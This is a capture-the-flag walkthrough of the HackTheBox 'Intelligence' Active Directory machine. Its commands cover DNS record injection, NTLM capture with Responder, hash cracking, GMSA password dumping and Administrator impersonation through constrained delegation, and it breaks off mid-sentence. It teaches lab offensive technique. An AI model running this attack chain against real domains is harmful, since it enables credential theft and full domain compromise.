---
layout: default
---


# Intelligence (AD Silver ticket)

# Skills

- Information leakage
- Poweshell script analysis
- DNS record injection
- Read GMSA password
- Silver Ticket Attack

# Enumeration

The enumeration with Nmap showed a lot of ports tipically related with Active Directory.

```bash
# Nmap 7.94 scan initiated Sun Oct 22 07:11:56 2023 as: nmap -p- -n -Pn -vvv -oG fast_v2 10.10.10.248
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.248 ()	Status: Up
Host: 10.10.10.248 ()	Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 
135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 
445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 
593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 
3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 
5985/open/tcp//wsman///, 9389/open/tcp//adws///, 
49667/open/tcp/////, 49691/open/tcp/////, 49692/open/tcp/////, 
49708/open/tcp/////, 49714/open/tcp/////	Ignored State: filtered (65516)
# Nmap done at Sun Oct 22 07:13:56 2023 -- 1 IP address (1 host up) scanned in 119.76 seconds
```

## DNS

We will try to get as many domains from the DNS and also try a transfer zone attack, but nothing of this is possible.

```bash
┌──(kali㉿kali)-[~]
└─$ dig ANY intelligence.htb @10.10.10.248

; <<>> DiG 9.18.16-1-Debian <<>> ANY intelligence.htb @10.10.10.248
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 61212
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;intelligence.htb.              IN      ANY

;; ANSWER SECTION:
intelligence.htb.       600     IN      A       10.10.10.248
intelligence.htb.       3600    IN      NS      dc.intelligence.htb.
intelligence.htb.       3600    IN      SOA     dc.intelligence.htb. hostmaster.intelligence.htb. 76 900 600 86400 3600
intelligence.htb.       600     IN      AAAA    dead:beef::1bb
intelligence.htb.       600     IN      AAAA    dead:beef::9c0:29a8:e31:db1e

;; ADDITIONAL SECTION:
dc.intelligence.htb.    1200    IN      A       10.10.10.248
dc.intelligence.htb.    1200    IN      AAAA    dead:beef::9c0:29a8:e31:db1e
dc.intelligence.htb.    1200    IN      AAAA    dead:beef::1bb

;; Query time: 56 msec
;; SERVER: 10.10.10.248#53(10.10.10.248) (TCP)
;; WHEN: Sun Oct 22 07:13:59 CEST 2023
;; MSG SIZE  rcvd: 253

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ dig axfr intelligence.htb @10.10.10.248

; <<>> DiG 9.18.16-1-Debian <<>> axfr intelligence.htb @10.10.10.248
;; global options: +cmd
; Transfer failed.
```

## RPC

- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/intelligence]
└─$ rpcclient -U '%' 10.10.10.248
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

## SMB

- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/intelligence]
└─$ smbclient -L \\\\10.10.10.248\\
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## LDAP

- Need credentials

```bash
┌──(kali㉿kali)-[~/machines/windows/intelligence]
└─$ windapsearch.py -d intelligence.htb --dc-ip 10.10.10.248 -U                                         
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.248
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=intelligence,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[!] Error retrieving users
[!] {'msgtype': 101, 'msgid': 3, 'result': 1, 'desc': 'Operations error', 'ctrls': [], 'info': '000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563'}
```

## HTTP

In the web page we don’t find anything via fuzzing, subdomain enumeration, cookies nor input. However, there are two PDFs with a name where we can see the date in a specific format. Maybe, we can perform a bruteforce attack and retrieve more PDFs. 

That’s exactly what we can do to retrieve a default password valid for one of the users (intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser6987) that can be used to further enumerate the domain. In addition, we can see in another PDF that some service accounts may be explotable. We enumerate users checking the creator of the PDFs, one of these has the default password as her password.

# Foothold

We can enumerate SMB folders now and we see IT, which seems interesting since one of the PDF we found is called IT Update.

```bash
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
IT              READ            
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
Users           READ
```

In IT share we found a powershell script that authenticates to multiple web servers.

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
    try {
        
        $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
        if(.StatusCode -ne 200) {
            Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
        }

    } catch {
        
    }
}
```

Moreover we can see that the script runs every five minutes. I’m not very good at powershell but it is clear that it is iterating over all the DNS records, and making a HTTP request with authentication to those domains whose name start with **web**. So if we are able to inject a DNS record, the user making the request (Ted.Graves) will probably authenticate againts us. To inject a DNS record we can use ********dnstool******** from [https://github.com/dirkjanm/krbrelayx/https://github.com/dirkjanm/krbrelayx/tree/mastertree/master](https://github.com/dirkjanm/krbrelayx/tree/master). 

```bash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r webcent -t A -d 10.10.14.2 10.10.10.248
```

We can check if the record has been injected using LDAP and making a query to the DC with `DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb` as base tree or simply using **nslookup**. We should see our injected record using any of these ways. Once the record has been successfully injected we need to set up responder to capture the credentials

```bash
sudo responder -I tun0
```

Eventually, we will have the NTLMv2 hash of the user Ted.Graves. That can be cracked using hashcat or john. I like Hashcat.

```bash
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:795ed731100fa3bf:EC36E05D2F850C3191B90CE10EFBD308:0101000000000000C9381448F792D7018BC129454A682E4000000000020008004B0054005000330001001E00570049004E002D0046005500450036004F00300059003800440049003200040014004B005400500033002E004C004F00430041004C0003003400570049004E002D0046005500450036004F003000590038004400490032002E004B005400500033002E004C004F00430041004C00050014004B005400500033002E004C004F00430041004C000800300030000000000000000000000000200000579BF3BE75B46EDA9826B9B1C8B2518795D25E61038C5C91F8A10A3DFB9AC4B70A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0030007800640066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

With all this we obtain the password for the user Ted.Graves → Mr.Teddy

Next step is to perform and deeper enumeration to see what new actions we can perform with the user Ted.Graves. We will do this with bloodhound. To gather all the information we will user `bloodhound-python`**.** The next images will show the path used to escalate privilage**.**

![Untitled](/images/intelligence.png)

![Untitled](/images/intelligence1.png)

![Untitled](/images/intelligence2.png)

The information about the groups os Ted.Graves reveals that he is part of the IT SUPPORT group. The members of this group have the right to read the GMSA password of the user SVC_INT. This password is reset after some time and is usually used in service accounts. Finally, the user SVC_INT has the property the right AllowToDelegate over WWW/dc.intelligence.htb, so he can request a silver ticket for that SPN as any user, which allow us to spawn a shell as the administrator in the DC.

# Privilege Escalation

First of all we need to read the GMSA password of the user SVC_INT.

```powershell
┌──(kali㉿kali)-[~/machines/windows/intelligence/gMSADumper]
└─$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::a9081669a8930109e4cd3421fd0ab06a
svc_int$:aes256-cts-hmac-sha1-96:48d714a87b0ab840286bee26b5067f93a1487bea5ac91a679b6f190dfa2614f2
svc_int$:aes128-cts-hmac-sha1-96:3af56845cf69669e62479ab36cde4b97
```

With these keys we can obtain a Silver Ticket for the user Administrator using the Allow to delegate privilage of the user SVC_INT.

```powershell
┌──(kali㉿kali)-[~/.local/bin]
└─$ cd ~/.local/bin/ && sudo ntpdate 10.10.10.248  && ./getST.py -k -no-pass -impersonate Administrator -spn WWW/dc.intelligence.htb intelligence.htb/svc_int$ -aesKey '48d714a87b0ab840286bee26b5067f93a1487bea5ac91a679b6f190dfa2614f2'
[sudo] password for kali: 
2023-10-25 01:43:09.802020 (+0200) +25201.248314 +/- 0.026798 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25201.248314
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Finally